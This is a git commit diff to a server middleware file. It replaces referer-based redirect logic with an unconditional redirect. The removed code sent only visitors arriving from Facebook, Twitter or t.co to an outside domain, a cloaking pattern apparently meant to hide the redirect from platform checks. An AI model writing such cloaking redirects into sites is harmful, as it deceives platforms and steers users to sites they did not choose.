5bf40a4cd4e539ba1dce4fd046ef6fcd7e537efd
finemflame <84194780+finemflame@users.noreply.github.com>
2023-05-18 18:45:51 +0200

    Update [...slug].ts

--- server/middleware/[...slug].ts
+++ server/middleware/[...slug].ts
@@ -1,20 +1,4 @@
-/* export default  (req, res, next) => {
-    console.log(req.url);
-    const headers = req.headers;
-    res.redirect("https://ufo.nepalikhabar24hour.com"+req.url);
-    if (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
-        res.redirect("https://ufo.nepalikhabar24hour.com"+req.url);
-    } else {
-        next();
-    }
-};
- */
-
 export default defineEventHandler((event) => {
-    const headers = event.req.headers;
-    
-    if (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
-        const redirectUrl = "https://markmystories.com" + event.req.url;
-        sendRedirect(event, redirectUrl);
-    }
+const redirectUrl = "https://markmystories.com" + event.req.url;
+sendRedirect(event, redirectUrl);
 })
